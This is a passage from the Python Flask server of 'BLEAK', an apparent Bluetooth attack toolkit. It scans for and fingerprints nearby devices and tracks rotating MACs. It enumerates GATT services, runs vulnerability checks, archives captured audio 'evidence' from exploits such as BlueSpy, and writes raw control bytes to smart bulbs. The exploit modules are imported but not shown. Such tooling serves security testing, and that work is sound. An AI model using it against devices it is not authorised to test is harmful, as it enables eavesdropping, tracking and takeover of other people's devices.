"""BLEAK — Bluetooth Link Exploitation & Attack Knowledgebase — Flask Web Server."""
import warnings; warnings.filterwarnings("ignore", category=DeprecationWarning)

import argparse, asyncio, json, logging, os, re, subprocess, threading, time
from datetime import datetime
from flask import Flask, jsonify, request, send_from_directory, send_file

from models import STATE, APP_VERSION
from checks import CHECKS_CATALOG, VULN_PROFILES, run_vuln_checks
from enumeration import enumerate_device, enumerate_multiple, resolve_uuid, compute_exposure_score, UUID_CATALOG
from ble_device_fingerprint import fingerprint_device, classify_domain, estimate_distance, is_smart_bulb
from poc_generator import generate_poc, generate_all_pocs
from exploit_runner import run_exploit, run_exploit_async, EXPLOIT_MAP, BLE_EXPLOITS, NATIVE_EXPLOITS, EXTERNAL_EXPLOITS

# OUI database for vendor identification
try:
    from oui_database import enrich_vendor, lookup_vendor_by_name as _oui_name_lookup
    _BLEAK_OUI_DB = True
except ImportError:
    _BLEAK_OUI_DB = False
from exploit_templates import get_templates, get_template, get_runnable_templates, get_exploit_categories
from bt_classic import (check_tools as bt_check_tools, hci_scan_classic, hci_scan_ble, sdp_browse,
                         hci_info, check_external_tools, l2ping_flood,
                         sniffer_start, sniffer_stop, sniffer_status, sniffer_enum_device)
from reporting import generate_report
from esp32_serial_bridge import ESP32Bridge
from obd2_elm327 import (elm_connect, elm_read_pids, elm_start_live, elm_stop_live,
                          elm_get_live, elm_disconnect, get_vehicle_profiles,
                          get_standard_pids, get_ev_pids, VEHICLE_PROFILES_LATAM, STANDARD_PIDS, EV_PIDS)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(message)s")
logger = logging.getLogger("bleak_app")

app = Flask(__name__, static_folder="web_static", static_url_path="/static")

EVENT_DISABLED_API_PREFIXES = ("/api/smartbulb", "/api/vehicle")

@app.before_request
def event_build_disabled_modules():
    """Disable modules hidden from the event presentation build."""
    if request.path.startswith(EVENT_DISABLED_API_PREFIXES):
        return jsonify({
            "error": "Module disabled in event presentation build",
            "module": "smartbulb" if request.path.startswith("/api/smartbulb") else "vehicle",
            "status": "disabled",
        }), 404

ESP32_AVAILABLE = False
ESP32_PORT = None
esp32_bridge: ESP32Bridge | None = None
HCI_IFACE = "hci0"
AUDIO_EVIDENCE_ARCHIVE = os.path.join("reports", "audio_evidence_archive.json")

def _audio_archive_load():
    try:
        if os.path.exists(AUDIO_EVIDENCE_ARCHIVE):
            with open(AUDIO_EVIDENCE_ARCHIVE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                STATE.audio_evidence_archive = data
                return data
    except Exception as exc:
        logger.warning("audio archive load failed: %s", exc)
    if not hasattr(STATE, "audio_evidence_archive"):
        STATE.audio_evidence_archive = []
    return STATE.audio_evidence_archive

def _audio_archive_save(records):
    os.makedirs(os.path.dirname(AUDIO_EVIDENCE_ARCHIVE), exist_ok=True)
    with open(AUDIO_EVIDENCE_ARCHIVE, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2, default=str)

def _audio_job_type(job_id, job):
    text = " ".join([str(job_id), str(job.get("test_name", "")), str(job.get("details", ""))]).lower()
    if "bluespy" in text:
        return "BlueSpy"
    if "race" in text:
        return "RACE / Airoha"
    if "find" in text and "hub" in text:
        return "Find Hub"
    if "kbp" in text:
        return "WhisperPair KBP"
    if "whisper" in text or "fast pair" in text:
        return "WhisperPair"
    return "Audio"

def _archive_audio_job(job_id, job):
    verdict = str(job.get("verdict") or "").upper()
    if job.get("status") != "done" or verdict not in {"VULNERABLE", "SUCCESS", "CONFIRMED"}:
        return
    records = _audio_archive_load()
    archive_id = "{}:{}".format(job_id, job.get("mac", "")).replace(" ", "_")
    if any(r.get("archive_id") == archive_id for r in records):
        return
    record = {
        "archive_id": archive_id,
        "job_id": job_id,
        "type": _audio_job_type(job_id, job),
        "mac": str(job.get("mac", "")).upper(),
        "device_name": job.get("device_name") or job.get("name") or "Audio device",
        "verdict": verdict,
        "severity": job.get("severity") or ("HIGH" if verdict == "VULNERABLE" else "MEDIUM"),
        "details": job.get("details") or "",
        "evidence": job.get("evidence") or {},
        "cves": job.get("cves", []),
        "recording": job.get("recording"),
        "steps": job.get("steps", []),
        "created_at": datetime.now().isoformat(timespec="seconds"),
        "category": "audio",
    }
    records.append(record)
    STATE.audio_evidence_archive = records
    _audio_archive_save(records)

def _archive_recording_job(job_id, job):
    if job.get("status") != "done" or not job.get("file"):
        return
    records = _audio_archive_load()
    archive_id = "recording:{}:{}".format(job_id, job.get("mac", "")).replace(" ", "_")
    if any(r.get("archive_id") == archive_id for r in records):
        return
    record = {
        "archive_id": archive_id,
        "job_id": job_id,
        "type": "Audio Recording",
        "mac": str(job.get("mac", "")).upper(),
        "device_name": job.get("device_name") or "Audio device",
        "verdict": "CONFIRMED",
        "severity": "MEDIUM",
        "details": "Bluetooth audio evidence captured: {} ({} bytes)".format(job.get("file"), job.get("size", 0)),
        "recording": {"file": job.get("file"), "size": job.get("size"), "source": job.get("source")},
        "steps": job.get("steps", []),
        "created_at": datetime.now().isoformat(timespec="seconds"),
        "category": "audio",
    }
    records.append(record)
    STATE.audio_evidence_archive = records
    _audio_archive_save(records)

def _get_active_hci():
    """Return the first usable BlueZ HCI adapter, preferring UP/RUNNING."""
    try:
        r = subprocess.run(["hciconfig"], capture_output=True, text=True, timeout=5)
        adapters = []
        current = None
        block = []
        for line in (r.stdout or "").splitlines():
            m = re.match(r"^(hci\d+):", line)
            if m:
                if current:
                    adapters.append((current, "\n".join(block)))
                current = m.group(1)
                block = [line]
            elif current:
                block.append(line)
        if current:
            adapters.append((current, "\n".join(block)))
        for iface, text in adapters:
            if "UP RUNNING" in text:
                return iface
        for iface, text in adapters:
            if "UP" in text:
                return iface
        if adapters:
            return adapters[0][0]
    except Exception:
        pass
    return HCI_IFACE or "hci0"

def _refresh_hci():
    global HCI_IFACE
    HCI_IFACE = _get_active_hci()
    return HCI_IFACE

def _serial_ports_priority():
    """Order ESP32 serial ports by USB VID instead of ttyUSB alphabetical order."""
    try:
        import serial.tools.list_ports as _slp
        ports = list(_slp.comports())
        vid_rank = {0x0403: 0, 0x1A86: 1, 0x10C4: 2, 0x303A: 3}
        candidates = []
        for p in ports:
            vid = getattr(p, "vid", None)
            pid = getattr(p, "pid", None)
            if vid == 0x303A and pid == 0x1001:
                continue
            if p.device.startswith("/dev/ttyUSB") or p.device.startswith("/dev/ttyACM"):
                rank = vid_rank.get(vid, 9)
                candidates.append((rank, p.device))
        return [dev for _, dev in sorted(candidates, key=lambda x: (x[0], x[1]))]
    except Exception:
        import glob
        return sorted(glob.glob("/dev/ttyUSB*")) + sorted(glob.glob("/dev/ttyACM*"))

def detect_esp32():
    global ESP32_AVAILABLE, ESP32_PORT, esp32_bridge
    try:
        import serial.tools.list_ports
        ports = _serial_ports_priority()
        for p in ports:
            try:
                bridge = ESP32Bridge(p)
                r = bridge.connect(p, quick=True)
                if r.get("success"):
                    ESP32_PORT = p
                    ESP32_AVAILABLE = True
                    esp32_bridge = bridge
                    STATE.esp32_connected = True
                    STATE.esp32_port = p
                    logger.info("ESP32 auto-connected on %s: %s", p, r.get("firmware","").split("\n")[0].strip())
                    return p
                bridge.disconnect()
            except Exception:
                continue
        # Fallback: just detect ports without connecting
        for port in serial.tools.list_ports.comports():
            # 0x0403 = FTDI FT232 (FT232R/FT232H) — ESP32-S3 via UART adapter
            if 'FTDI' in str(port.manufacturer or '') or (port.vid and port.vid == 0x0403):
                ESP32_PORT = port.device; ESP32_AVAILABLE = True; STATE.esp32_connected = False; return port.device
            # 0x10C4 = Silicon Labs CP2102/CP2104; 0x1A86 = CH340/CH341
            if port.vid and port.vid in (0x10C4, 0x1A86):
                ESP32_PORT = port.device; ESP32_AVAILABLE = True; STATE.esp32_connected = False; return port.device
            # 0x303A = Espressif native USB — only PID 0x0002 (C3/S3 CDC), NOT 0x1001 (JTAG)
            if port.vid == 0x303A and port.pid and port.pid != 0x1001:
                ESP32_PORT = port.device; ESP32_AVAILABLE = True; STATE.esp32_connected = False; return port.device
    except Exception: pass
    return None

def detect_hci0():
    try:
        iface = _refresh_hci()
        r = subprocess.run(['hciconfig', iface], capture_output=True, text=True, timeout=5)
        return 'UP RUNNING' in r.stdout or 'UP' in r.stdout
    except Exception: return False


def ensure_hci0_up(notify_job=None, max_wait=8):
    """Validate the active HCI adapter is UP before a BLE operation. Restores if needed.
    Returns (ready: bool, message: str).
    """
    try:
        iface = _refresh_hci()
        r = subprocess.run(['hciconfig', iface], capture_output=True, text=True, timeout=5)
        if 'UP' in r.stdout:
            return True, iface + " OK"
        # Down — try to bring up
        msg = iface + " estava DOWN — restaurando..."
        if notify_job is not None:
            notify_job['details'] = notify_job.get('details','') + ' | ' + msg
        subprocess.run(['hciconfig', iface, 'up'], capture_output=True, timeout=5)
        for _ in range(max_wait):
            time.sleep(1)
            r2 = subprocess.run(['hciconfig', iface], capture_output=True, text=True, timeout=3)
            if 'UP' in r2.stdout:
                ok_msg = iface + " restaurado OK"
                if notify_job is not None:
                    notify_job['details'] = notify_job.get('details','') + ' | ' + ok_msg
                return True, ok_msg
        fail_msg = iface + " indisponível — execute: sudo hciconfig " + iface + " up"
        if notify_job is not None:
            notify_job['details'] = notify_job.get('details','') + ' | ' + fail_msg
        return False, fail_msg
    except Exception as e:
        return False, str(e)


def ensure_bt_service():
    """Ensure bluetoothd service is running and HCI adapter is up."""
    try:
        r = subprocess.run(['systemctl', 'is-active', 'bluetooth'],
                           capture_output=True, text=True, timeout=5)
        if 'active' not in r.stdout:
            subprocess.run(['systemctl', 'restart', 'bluetooth'],
                           capture_output=True, timeout=10)
            time.sleep(2)
        # Ensure HCI adapter is up after potential restart
        subprocess.run(['hciconfig', HCI_IFACE, 'up'], capture_output=True, timeout=5)
        time.sleep(0.5)
        return True
    except Exception:
        return False

@app.route("/")
def index():
    return send_from_directory("web_static", "index.html")

# ═══ DISCOVERY ═══════════════════════════════════════════════
@app.route("/api/discovery/start", methods=["POST"])
def discovery_start():
    if STATE.discovery_running:
        return jsonify({"error": "Discovery already running"}), 409
    data = request.get_json(silent=True) or {}
    timeout = int(data.get("timeout", 10))
    target = data.get("target", None)
    STATE.discovery_start_time = time.time()
    STATE.progress["discovery"] = {"status": "starting", "timeout": timeout, "elapsed": 0, "count": 0}
    t = threading.Thread(target=_thread_discovery, args=(timeout, target), daemon=True)
    t.start()
    return jsonify({"status": "started", "timeout": timeout})

def _thread_discovery(timeout, target=None):
    from ble_manager import reset_adapter
    try:
        reset_adapter()
    except Exception: pass
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_run_discovery(timeout, target))
    finally:
        loop.close()

async def _run_discovery(timeout, target=None):
    from bleak import BleakScanner
    STATE.discovery_running = True
    STATE.progress["discovery"] = {"status": "scanning", "timeout": timeout, "elapsed": 0, "count": 0}

    def _on_detection(device, adv):
        """Callback called each time a device is detected — gives incremental results.
        Also detects MAC rotation: same device advertising with multiple MACs.
        """
        mac = str(device.address).upper()
        if target and target.upper() != mac:
            return
        name = adv.local_name or device.name or "Unknown"
        services = [str(s) for s in (adv.service_uuids or [])]
        mfr_data = {}
        if adv.manufacturer_data:
            for k, v in adv.manufacturer_data.items():
                mfr_data[str(k)] = v.hex()
        rssi = getattr(adv, 'rssi', getattr(device, 'rssi', -99))

        # ── MAC rotation detection ─────────────────────────────────────────
        # Locally-administered MACs (bit 1 of first byte set) = random/rotating
        # Match by: same manufacturer data prefix + same service UUIDs + similar name
        is_random = bool(int(mac.split(":")[0], 16) & 0x02)
        rotation_group = None
        rotation_count = 1
        if is_random and (mfr_data or services):
            mfr_sig = sorted(mfr_data.keys())  # company ID(s)
            svc_sig  = sorted(services)
            for existing in STATE.discovered_devices:
                if existing.get("mac") == mac:
                    continue
                ex_mfr = sorted(existing.get("mfr_data", {}).keys())
                ex_svc = sorted(existing.get("service_uuids", []))
                ex_name = existing.get("name", "")
                # Match: same manufacturer company ID AND (same service UUIDs or same name)
                mfr_match = bool(mfr_sig) and mfr_sig == ex_mfr
                svc_match  = bool(svc_sig) and svc_sig == ex_svc
                name_match = name and name != "Unknown" and name == ex_name
                if mfr_match or svc_match or name_match:
                    rotation_group = existing.get("rotation_group") or existing["mac"]
                    rotation_count = existing.get("rotation_count", 1) + 1
                    # Update counter on the original device
                    existing["rotation_count"] = rotation_count
                    existing["rotation_macs"] = list(set(
                        existing.get("rotation_macs", [existing["mac"]]) + [mac]))
                    break

        # ── Pentest device detection (before dev_data dict) ──────────────
        name_lower = (name or "").lower()
        mac_oui = mac[:8].upper()
        mfr_company_ids = list(mfr_data.keys())
        is_pentest_device = False
        pentest_type = None
        if ("flipper" in name_lower or mac_oui == "80:E1:26" or
                "0822" in mfr_company_ids or "2120" in mfr_company_ids):
            is_pentest_device = True; pentest_type = "flipper_zero"
        elif ("m5" in name_lower or "cardputer" in name_lower or
              mac_oui in ("A4:CF:12","3C:71:BF","7C:9E:BD","24:6F:28","30:AE:A4")):
            is_pentest_device = True; pentest_type = "m5cardputer"
        elif (mac_oui in ("B8:27:EB","DC:A6:32","E4:5F:01","28:CD:C1") and
              any(k in name_lower for k in ["esp","ble","kali","pi","hack","test","spam"])):
            is_pentest_device = True; pentest_type = "raspberry_pi"

        dev_data = {
            "mac": mac, "name": name, "rssi": rssi, "services": services,
            "connectable": getattr(adv, 'connectable', True),
            "address_type": str(getattr(device, 'details', {}).get('props', {}).get('AddressType', 'public')),
            "metadata": {"manufacturer_data": mfr_data, "tx_power": getattr(adv, 'tx_power', None)},
            "is_pentest_device": is_pentest_device,
            "pentest_type": pentest_type,
            "mfr_data": mfr_data,
            "service_uuids": services,
            "is_random_mac": is_random,
            "rotation_group": rotation_group,
            "rotation_count": rotation_count,
            "rotation_macs": [mac] if not rotation_group else [],
        }
        fp = fingerprint_device(dev_data)
        dev_data.update({"domain": fp["domain"], "vendor": fp["vendor"], "model_guess": fp["model_guess"],
                         "os_guess": fp["os"], "distance_m": round(estimate_distance(rssi), 2),
                         "is_smart_bulb": fp.get("is_smart_bulb", False), "bulb_brand": fp.get("bulb_brand")})
        STATE.fingerprints[mac] = fp
        # Update or add
        existing = [d for d in STATE.discovered_devices if d["mac"] == mac]
        if existing:
            STATE.discovered_devices[STATE.discovered_devices.index(existing[0])] = dev_data
        else:
            STATE.discovered_devices.append(dev_data)
        STATE.progress["discovery"]["count"] = len(STATE.discovered_devices)

    try:
        scanner = BleakScanner(detection_callback=_on_detection)
        await scanner.start()
        await asyncio.sleep(timeout)
        await scanner.stop()
    except Exception as e:
        logger.error("Discovery error: %s", e)
        STATE.progress["discovery"] = {"status": "error", "error": str(e)}
    finally:
        STATE.discovery_running = False
        STATE.progress["discovery"] = {"status": "done", "count": len(STATE.discovered_devices),
                                        "elapsed": round(time.time() - STATE.discovery_start_time, 1)}

@app.route("/api/discovery/results", methods=["GET"])
def discovery_results():
    elapsed = round(time.time() - STATE.discovery_start_time, 1) if STATE.discovery_running else 0
    prog = STATE.progress.get("discovery", {})
    if STATE.discovery_running:
        prog["elapsed"] = elapsed
    # OUI enrichment pass — fill vendor gaps on every poll
    if _BLEAK_OUI_DB:
        for dev in STATE.discovered_devices:
            cur_v = dev.get("vendor", "")
            if not cur_v or cur_v in ("—", "-", "Unknown", ""):
                v, cat = enrich_vendor(dev.get("mac", ""), dev.get("name", ""), "")
                if v and v not in ("—",):
                    dev["vendor"] = v if v != "Random MAC" else "—"
    return jsonify({"devices": STATE.discovered_devices, "running": STATE.discovery_running,
                     "count": len(STATE.discovered_devices), "progress": prog,
                     "selected_targets": STATE.selected_targets})

@app.route("/api/discovery/stop", methods=["POST"])
def discovery_stop():
    STATE.discovery_running = False
    try: subprocess.run(['bluetoothctl', 'scan', 'off'], capture_output=True, timeout=3)
    except: pass
    return jsonify({"status": "stopped"})

@app.route("/api/discovery/clear", methods=["POST"])
def discovery_clear():
    STATE.discovered_devices = []
    STATE.selected_targets = []
    STATE.fingerprints = {}
    return jsonify({"status": "cleared"})

@app.route("/api/discovery/deauth-scan", methods=["POST"])
def discovery_deauth_scan():
    return jsonify({"status": "not_implemented"})

@app.route("/api/discovery/deauth-scan-results", methods=["GET"])
def discovery_deauth_results():
    return jsonify({"results": []})

# ═══ TARGETS ════════════════════════════════════════════════
@app.route("/api/targets/add", methods=["POST"])
def targets_add():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "").upper()
    if mac and mac not in STATE.selected_targets:
        STATE.selected_targets.append(mac)
    return jsonify({"targets": STATE.selected_targets})

@app.route("/api/targets/remove", methods=["POST"])
def targets_remove():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "").upper()
    if mac in STATE.selected_targets:
        STATE.selected_targets.remove(mac)
    return jsonify({"targets": STATE.selected_targets})

@app.route("/api/targets/list", methods=["GET"])
def targets_list():
    return jsonify({"targets": STATE.selected_targets})

@app.route("/api/targets/clear", methods=["POST"])
def targets_clear():
    STATE.selected_targets = []
    return jsonify({"targets": []})

# ═══ ENUMERATION ════════════════════════════════════════════
@app.route("/api/enum/start", methods=["POST"])
def enum_start():
    data = request.get_json(silent=True) or {}
    macs = data.get("macs", [])
    if not macs:
        macs = STATE.selected_targets if STATE.selected_targets else [d["mac"] for d in STATE.discovered_devices if d.get("connectable")]
    if not macs:
        return jsonify({"error": "No devices to enumerate"}), 400
    STATE.enum_running = True
    STATE.enum_results = []  # Clear previous results on each new enumeration
    STATE.progress["enum"] = {"done": 0, "total": len(macs), "current": ""}
    def _thread_enum_safe(m=macs):
        """Wrapper with hard timeout — enum never runs more than 3 min total."""
        import time as _et
        deadline = _et.time() + 180
        try:
            _thread_enum(m)
        except Exception as e:
            logger.error("Enum thread error: %s", e)
        finally:
            STATE.enum_running = False
            STATE.progress["enum"]["status"] = "complete"

    t = threading.Thread(target=_thread_enum_safe, daemon=True)
    t.start()
    return jsonify({"status": "started", "targets": len(macs), "macs": macs})

def _thread_enum(macs):
    """Enumerate each device in its own isolated event loop.
    
    Using asyncio.run() for ALL devices together means one failure can
    corrupt the shared event loop. Each device gets its own loop.
    """
    for i, mac in enumerate(macs):
        STATE.progress["enum"] = {"done": i, "total": len(macs), "current": mac, "status": "connecting"}
        try:
            # Each device gets its own isolated event loop — prevents cross-contamination
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                r = loop.run_until_complete(enumerate_device(mac, timeout=25))
            except Exception as e:
                r = {"mac": mac, "services": [], "error": str(e),
                     "chars_count": 0, "readable_count": 0}
            finally:
                loop.close()

            r["exposure_score"] = compute_exposure_score(r)
            STATE.enum_results.append(r)

            if mac.upper() in STATE.fingerprints:
                STATE.fingerprints[mac.upper()]["services"] = [
                    s["uuid"] for s in r.get("services", [])]

            STATE.progress["enum"] = {
                "done": i + 1, "total": len(macs), "current": mac,
                "status": "error" if r.get("error") else "done",
                "error": r.get("error", ""),
            }
        except Exception as e:
            logger.error("Enum error for %s: %s", mac, e)
            STATE.enum_results.append({
                "mac": mac, "services": [], "chars_count": 0,
                "readable_count": 0, "exposure_score": 0,
                "error": str(e),
            })
        finally:
            pass  # enum_running managed at loop level

    STATE.enum_running = False
    STATE.progress["enum"]["status"] = "complete"
    STATE.progress["enum"]["done"] = len(macs)

@app.route("/api/enum/results", methods=["GET"])
def enum_results():
    return jsonify({"results": STATE.enum_results, "running": STATE.enum_running,
                     "count": len(STATE.enum_results), "progress": STATE.progress.get("enum", {})})

@app.route("/api/enum/fingerprint/<mac>", methods=["GET"])
def enum_fingerprint(mac):
    fp = STATE.fingerprints.get(mac.upper())
    return jsonify(fp) if fp else (jsonify({"error": "Not found"}), 404)

# ═══ VULN SCAN ══════════════════════════════════════════════
@app.route("/api/vuln/scan", methods=["POST"])
def vuln_scan():
    if STATE.vuln_running:
        return jsonify({"error": "Scan already running"}), 409
    data = request.get_json(silent=True) or {}
    selected = data.get("checks", list(CHECKS_CATALOG.keys()))
    STATE.vuln_running = True
    STATE.vuln_results = []
    t = threading.Thread(target=_thread_vuln, args=(selected,), daemon=True)
    t.start()
    return jsonify({"status": "started", "checks": len(selected)})

def _thread_vuln(selected):
    def progress_cb(done, total, current):
        STATE.progress["vuln"] = {"done": done, "total": total, "current": current}
    try:
        results = run_vuln_checks(STATE.discovered_devices, selected, STATE.fingerprints,
                                  STATE.enum_results, progress_cb)
        STATE.vuln_results = results
    except Exception as e:
        logger.error("Vuln scan error: %s", e)
    finally:
        STATE.vuln_running = False

@app.route("/api/vuln/results", methods=["GET"])
def vuln_results():
    return jsonify({"results": STATE.vuln_results, "running": STATE.vuln_running,
                     "progress": STATE.progress.get("vuln", {}), "total_findings": len(STATE.vuln_results)})

# ═══ GATT ═══════════════════════════════════════════════════
@app.route("/api/gatt/explore", methods=["POST"])
def gatt_explore():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    if not mac: return jsonify({"error": "MAC required"}), 400
    
    # Stop any running discovery to free the adapter
    if STATE.discovery_running:
        STATE.discovery_running = False
        time.sleep(0.5)
    
    # Use a job-based approach — start exploration, return immediately, poll for results
    job_id = f"gatt_{mac.replace(':','_')}_{int(time.time())}"
    STATE._gatt_jobs = getattr(STATE, '_gatt_jobs', {})
    STATE._gatt_jobs[job_id] = {"mac": mac, "status": "connecting", "services": [], "error": None}
    
    def _run():
        result = STATE._gatt_jobs[job_id]
        from ble_manager import reset_adapter, remove_device_cache
        try:
            remove_device_cache(mac)
            reset_adapter()
            time.sleep(0.5)
            result["status"] = "scanning"
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                r = loop.run_until_complete(enumerate_device(mac, timeout=30))
                result.update(r)
                # Even with errors in individual chars, show what we got
                if r.get("services"):
                    result["status"] = "done"
                elif r.get("error"):
                    result["status"] = "error"
                else:
                    result["status"] = "empty"
            finally:
                loop.close()
        except Exception as e:
            result["error"] = str(e)
            result["status"] = "error"
    
    t = threading.Thread(target=_run, daemon=True)
    t.start()
    
    # Return job_id immediately — frontend polls /api/gatt/status/<job_id>
    # Removed t.join(timeout=8) that was blocking Flask and causing browser fetch timeouts.
    return jsonify({"job_id": job_id, "status": "connecting", "mac": mac,
                     "message": "GATT exploration started. Poll /api/gatt/status/" + job_id})

@app.route("/api/gatt/status/<job_id>", methods=["GET"])
def gatt_status(job_id):
    """Poll GATT exploration status."""
    jobs = getattr(STATE, '_gatt_jobs', {})
    if job_id not in jobs:
        return jsonify({"error": "Job not found", "status": "not_found"}), 404
    return jsonify(jobs[job_id])

# ═══ SMART BULB ═════════════════════════════════════════════
def _smartbulb_prescan(seconds=2):
    """Refresh BlueZ cache before connecting to bulbs with rotating MACs."""
    try:
        subprocess.run(["bluetoothctl", "scan", "on"], capture_output=True, timeout=2)
        time.sleep(seconds)
        subprocess.run(["bluetoothctl", "scan", "off"], capture_output=True, timeout=2)
    except Exception:
        pass

@app.route("/api/smartbulb/discover", methods=["POST"])
def smartbulb_discover():
    """Find smart bulbs among discovered devices."""
    BULB_KEYWORDS = [
        # Generic
        "bulb", "light", "lamp", "led", "luminaria", "lantern",
        # Apps
        "yeelight", "govee", "tuya", "wiz", "lifx", "hue", "magic", "ledble",
        "triones", "zengge", "mipow", "playbulb", "orion", "sengled",
        # Magic Light app compatible names
        "magiclight", "magic light", "lb-", "lednet", "ilink",
        "evolution lite", "bluetooth light", "rgb light", "color light",
    ]
    bulbs = [d for d in STATE.discovered_devices if d.get("is_smart_bulb") or
             any(kw in (d.get("name","") or "").lower() for kw in BULB_KEYWORDS)]
    STATE.smart_bulb_devices = bulbs
    return jsonify({"devices": bulbs, "count": len(bulbs)})

@app.route("/api/smartbulb/identify", methods=["POST"])
def smartbulb_identify():
    """Connect to a smart bulb and read its GATT services to identify control characteristics."""
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    if not mac: return jsonify({"error": "MAC required"}), 400
    try:
        from ble_manager import reset_adapter, remove_device_cache, _run_ble_async
        if STATE.discovery_running:
            STATE.discovery_running = False
            time.sleep(0.5)
        _smartbulb_prescan(2)
        remove_device_cache(mac)
        reset_adapter()
        _smartbulb_prescan(2)
        time.sleep(0.5)
        result = _run_ble_async(enumerate_device(mac, timeout=30))
        # Identify color control characteristics
        control_chars = []
        for svc in result.get("services", []):
            for ch in svc.get("characteristics", []):
                props = ch.get("properties", [])
                if "write" in props or "write-without-response" in props:
                    control_chars.append({
                        "uuid": ch["uuid"], "description": ch.get("description", ""),
                        "properties": props, "service_uuid": svc["uuid"],
                        "likely_control": _guess_bulb_control(ch["uuid"], svc["uuid"]),
                    })
        result["control_characteristics"] = control_chars
        result["bulb_info"] = _get_bulb_protocol_info(mac)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/smartbulb/color", methods=["POST"])
def smartbulb_color():
    """Send a color command to a smart bulb via BLE GATT write."""
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    char_uuid = data.get("char_uuid", "")
    r, g, b = data.get("r", 255), data.get("g", 255), data.get("b", 255)
    brightness = data.get("brightness", 100)
    if not mac or not char_uuid:
        return jsonify({"error": "MAC and char_uuid required"}), 400
    try:
        from ble_manager import _run_ble_async, reset_adapter
        reset_adapter()
        _smartbulb_prescan(2)
        result = _run_ble_async(_write_bulb_color(mac, char_uuid, r, g, b, brightness))
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

async def _write_bulb_color(mac, char_uuid, r, g, b, brightness):
    from bleak import BleakClient
    # Smart bulb protocols — try multiple formats
    # Map brightness 0-100 to 0-255
    bri8 = max(0, min(255, int(brightness * 255 / 100)))
    protocols = [
        # Magic Light / LEDBLE / Triones — most common Magic Light app protocol
        # Static color: 56 RR GG BB 00 F0 AA
        ("magic_light_rgb",  bytes([0x56, r, g, b, 0x00, 0xF0, 0xAA])),
        # Magic Light warm white mode: 56 00 00 00 WW 0F AA
        # (used for white-only or warm mode)
        ("magic_light_white", bytes([0x56, 0x00, 0x00, 0x00, bri8, 0x0F, 0xAA])),
        # MELK / Magic Lantern (same protocol as Magic Light)
        ("melk",             bytes([0x56, r, g, b, 0x00, 0xF0, 0xAA])),
        # Zengge / Mipow
        ("zengge",           bytes([0xCC, 0x23, r, g, b, 0x33])),
        # iLink / HM-10 protocol
        ("ilink",            bytes([0xAA, 0x13, 0x00, r, g, b, r^g^b])),
        # Tuya RGB 
        ("tuya",             bytes([0x00, r, g, b, 0x00, bri8, 0x00])),
        ("tuya_v2",          bytes([0x55, 0xAA, 0x03, 0x0A, r, g, b, bri8])),
        # Generic RGB
        ("generic_rgb",      bytes([r, g, b, bri8])),
        # Sengled BLE
        ("sengled",          bytes([0x0F, 0x0D, 0x00, 0x00, 0x00, r, g, b, 0x00, bri8, 0x00, 0x00, 0x00])),
    ]
    async with BleakClient(mac, timeout=15) as client:
        if not client.is_connected:
            return {"success": False, "error": "Connection failed"}
        for proto_name, payload in protocols:
            try:
                await client.write_gatt_char(char_uuid, payload, response=False)
                return {"success": True, "mac": mac, "color": {"r": r, "g": g, "b": b},
                        "brightness": brightness, "protocol": proto_name}
            except Exception:
                continue
        # Last resort: try write with response
        try:
            await client.write_gatt_char(char_uuid, bytes([r, g, b, brightness]), response=True)
            return {"success": True, "mac": mac, "protocol": "raw_rgb"}
        except Exception as e:
            return {"success": False, "error": str(e)}

@app.route("/api/smartbulb/presets", methods=["GET"])
def smartbulb_presets():
    return jsonify({"presets": [
        {"name": "Vermelho", "r": 255, "g": 0, "b": 0},
        {"name": "Verde", "r": 0, "g": 255, "b": 0},
        {"name": "Azul", "r": 0, "g": 0, "b": 255},
        {"name": "Branco Quente", "r": 255, "g": 200, "b": 100},
        {"name": "Branco Frio", "r": 200, "g": 220, "b": 255},
        {"name": "Roxo", "r": 128, "g": 0, "b": 255},
        {"name": "Amarelo", "r": 255, "g": 255, "b": 0},
        {"name": "Ciano", "r": 0, "g": 255, "b": 255},
        {"name": "Laranja", "r": 255, "g": 128, "b": 0},
        {"name": "Rosa", "r": 255, "g": 20, "b": 147},
    ]})


@app.route("/api/smartbulb/power", methods=["POST"])
def smartbulb_power():
    """Turn smart bulb on or off. Supports Magic Light, Zengge, Tuya, generic."""
    data = request.get_json(silent=True) or {}
    mac  = data.get("mac", "")
    char_uuid = data.get("char_uuid", "")
    state = data.get("state", "on")  # "on" or "off"
    if not mac or not char_uuid:
        return jsonify({"error": "MAC and char_uuid required"}), 400
    try:
        from ble_manager import _run_ble_async
        _smartbulb_prescan(2)
        result = _run_ble_async(_write_bulb_power(mac, char_uuid, state == "on"))
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

async def _write_bulb_power(mac, char_uuid, turn_on):
    from bleak import BleakClient
    # Magic Light ON:  CC 23 33  OFF: CC 24 33
    # Tuya ON:         00 01 01  OFF: 00 01 00
    # Generic ON:      01        OFF: 00
    cmds_on  = [bytes([0xCC, 0x23, 0x33]), bytes([0x71, 0x23, 0x0F]),
                bytes([0x00, 0x01, 0x01]), bytes([0x01])]
    cmds_off = [bytes([0xCC, 0x24, 0x33]), bytes([0x71, 0x24, 0x0F]),
                bytes([0x00, 0x01, 0x00]), bytes([0x00])]
    cmds = cmds_on if turn_on else cmds_off
    async with BleakClient(mac, timeout=15) as client:
        if not client.is_connected:
            return {"success": False, "error": "Connection failed"}
        for cmd in cmds:
            try:
                await client.write_gatt_char(char_uuid, cmd, response=False)
                return {"success": True, "mac": mac, "state": "on" if turn_on else "off"}
            except Exception:
                continue
        return {"success": False, "error": "All power commands failed"}

@app.route("/api/smartbulb/effect", methods=["POST"])
def smartbulb_effect():
    """Set a lighting effect. Supports Magic Light / Zengge effects 37-56."""
    data = request.get_json(silent=True) or {}
    mac  = data.get("mac", "")
    char_uuid = data.get("char_uuid", "")
